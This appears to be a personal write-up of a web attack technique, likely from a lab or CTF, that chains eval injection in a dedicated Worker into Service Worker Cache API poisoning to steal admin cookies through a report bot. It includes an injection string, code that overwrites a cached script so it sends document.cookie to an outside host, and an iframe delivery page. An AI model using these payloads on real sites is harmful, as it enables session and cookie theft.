# Dedicated Worker Eval → Cache API / SW Cache Poison

## Date

2026-07-09

## Target Type

SPAs with dedicated Workers, Service Worker Cache API, and admin/report bots

## Bug Class

Code injection in Worker (`eval` / `Function`), Cache API poisoning, Service Worker cache-first escalation, admin bot abuse

## Initial Signal

- Dedicated Worker receives URL/path/query and builds a string for `eval`
- SW registers with a named cache (`caches.open('...')`) and cache-first for static scripts
- A small `/static/app.js` (or similar) is loaded on every page and is SW-cached
- Report/review bot visits attacker-controlled URLs
- Goal mentions stealing admin/boss cookies

## Working Theory

1. Break out of the worker `eval` string with a quote in the controlled input.
2. From the worker, `caches.open(CACHE_NAME).put('/static/app.js', new Response(maliciousJs, {headers:{'Content-Type':'application/javascript'}}))`.
3. On the next **full document load in the same browser profile**, the SW serves the poisoned script on the main thread.
4. Main-thread code can read `document.cookie` and navigate/exfil.

## Pattern

```text
Source: location.pathname (or other string posted to Worker)
Transform: string concat into eval expression
Sink: eval / Function
Escalation: Cache API put of a main-thread script
Delivery: same browser profile must reload the origin
```

## Example

Injection shape:

```text
') > -1 || (ATTACK), ('
```

Poison:

```js
caches.open('contenthub-v1').then(c =>
  c.put('/static/app.js', new Response(
    "location.replace('https://[oast]/?c='+encodeURIComponent(document.cookie))",
    {headers:{'Content-Type':'application/javascript'}}
  ))
);
```

Same-profile delivery when the bot accepts external URLs:

```html
<iframe src="https://[lab]/poison-path"></iframe>
<script>
setTimeout(() => location.replace('https://[lab]/'), 4000);
</script>
```

## Common Mistake

Assuming two separate bot visits share Cache API state. Many headless bots use a **fresh profile per visit**, so stage1 poison + stage2 load fails even when both reports queue successfully.

Also:

- Worker cannot read `document.cookie` / often has no `cookieStore`
- Forging HTML into React text nodes is not XSS
- Async exfil may lose the race against bot teardown — prefer sync work + `location.replace`

## Drill

1. Read the worker source; find `eval` / `Function` / `setTimeout(string)`.
2. Confirm Cache API name from `sw.js`.
3. Prove poison locally: put → `fetch('/static/app.js')` returns attacker body.
4. Test whether bot visits share a profile (two-report vs iframe+navigate).
5. Exfil with main-thread cookie / credentialed sync XHR as needed.

## Checklist Update

Add to admin-bot / XSS recon:

- [ ] Worker `eval` / string-to-code sinks on path or message data
- [ ] SW cache name and which scripts are cache-first
- [ ] Can worker/page write Cache API?
- [ ] Do separate bot visits reset browser profile?
- [ ] If external report URLs allowed: iframe poison → top navigate same session
